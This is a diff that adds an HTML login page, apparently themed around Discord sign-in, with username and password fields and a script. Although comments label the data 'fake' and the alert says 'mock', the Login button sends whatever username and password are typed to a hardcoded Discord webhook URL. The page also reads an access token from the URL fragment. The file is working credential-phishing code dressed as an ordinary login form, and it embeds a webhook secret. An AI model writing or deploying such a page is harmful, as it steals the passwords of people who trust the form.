@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login</title>
+  <style>
+    body {
+      background: #1e1e2f;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: #2e2e3e;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      width: 300px;
+      text-align: center;
+    }
+    input {
+      display: block;
+      width: 100%;
+      margin: 10px 0;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+    }
+    button {
+      background: #00b894;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #00cec9;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <h2 id="greeting">Logging in...</h2>
+  <input type="text" id="username" placeholder="Username" />
+  <input type="password" id="password" placeholder="Password" />
+  <button onclick="sendToWebhook()">Login</button>
+</div>
+
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1359463177359855706/9r73rc7pZA-U2RgXAXgyDIBlivvoexHG5EtB6GYNrsb__lcfeRuTMwlEpXqTc-I2mQfz";
+
+  // Step 1: Get Access Token from URL Fragment
+  const fragment = new URLSearchParams(window.location.hash.slice(1));
+  const accessToken = fragment.get('access_token');
+
+  // Step 2: Fetch user info from Discord API
+  if (accessToken) {
+    fetch("https://discord.com/api/users/@me", {
+      headers: {
+        Authorization: `Bearer ${accessToken}`
+      }
+    })
+    .then(res => res.json())
+    .then(user => {
+      document.getElementById('greeting').innerText = `Successfully logged in, ${user.username}#${user.discriminator}`;
+    });
+  } else {
+    document.getElementById('greeting').innerText = `Not logged in via Discord`;
+  }
+
+  // Step 3: Send fake credentials to Discord Webhook
+  function sendToWebhook() {
+    const fakeUser = document.getElementById('username').value;
+    const fakePass = document.getElementById('password').value;
+
+    const data = {
+      content: `🟢 Credentials Entered:\n**Username:** ${fakeUser}\n**Password:** ${fakePass}`
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    }).then(() => {
+      alert("Credentials sent (mock).");
+    });
+  }
+</script>
+
+</body>
+</html>
